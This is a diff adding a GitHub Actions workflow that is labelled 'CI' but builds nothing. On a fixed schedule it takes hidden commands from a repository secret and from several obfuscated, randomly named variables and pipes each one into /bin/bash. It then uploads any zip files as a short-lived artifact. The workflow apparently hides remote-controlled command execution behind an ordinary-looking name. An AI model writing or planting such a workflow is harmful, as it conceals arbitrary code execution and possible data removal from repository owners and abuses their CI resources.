@@ -1,0 +1,35 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          ydr081: ${{ secrets.ydr081 }}
+        run: |
+          printf '%s' "$ydr081" | jq -r .jce6852 | /bin/bash
+          echo $deed3444 | jq -r .s5758 | /bin/bash
+          echo $lslhm982 | jq -r .c3 | /bin/bash
+          printf '%s' "$zcc90242" | jq -r .u1065 | /bin/bash
+          echo $j2 | jq -r .pfwkx48377 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5qEM0cfg
+          path: "*.zip"
+          retention-days: 1
